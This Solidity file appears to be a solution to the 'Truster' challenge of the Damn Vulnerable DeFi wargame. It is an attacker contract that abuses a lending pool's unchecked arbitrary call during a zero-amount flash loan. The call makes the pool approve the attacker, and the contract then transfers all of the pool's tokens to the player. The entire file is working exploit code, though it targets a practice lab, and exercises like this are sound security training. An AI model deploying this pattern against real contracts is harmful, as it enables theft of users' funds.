// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TrusterLenderPool.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPoolAttacker {

    TrusterLenderPool _trusterLenderPool;
    DamnValuableToken _damnValuableToken;
    address _player;
    uint _flashloanAmount;

    constructor(address trusterLenderPoolAddress,address damnValuableTokenAddress,address player,uint flashloanAmount){
        _trusterLenderPool = TrusterLenderPool(trusterLenderPoolAddress);
        _damnValuableToken = DamnValuableToken(damnValuableTokenAddress);
        _player = player;
        _flashloanAmount = flashloanAmount;

    }

    /**
       FlashLoan zero amount and let the TrusterLenderPool approve this contract have the allowance(_flashloanAmount) for DamnValuableToken by execute `target.functionCall(data);`
       The data, which includes the funtion:  approve(address,uint256) and the operator address(this address)

       Lastly,let this contract transfer all token from TrusterLenderPool to player(msg.sender) address
     */
    function callFlashLoan() external{

        bytes memory data = abi.encodeWithSignature("approve(address,uint256)",address(this),_flashloanAmount);
        _trusterLenderPool.flashLoan(0,address(this),address(_damnValuableToken),data);
        _damnValuableToken.transferFrom(address(_trusterLenderPool),msg.sender,_flashloanAmount);
    }
}
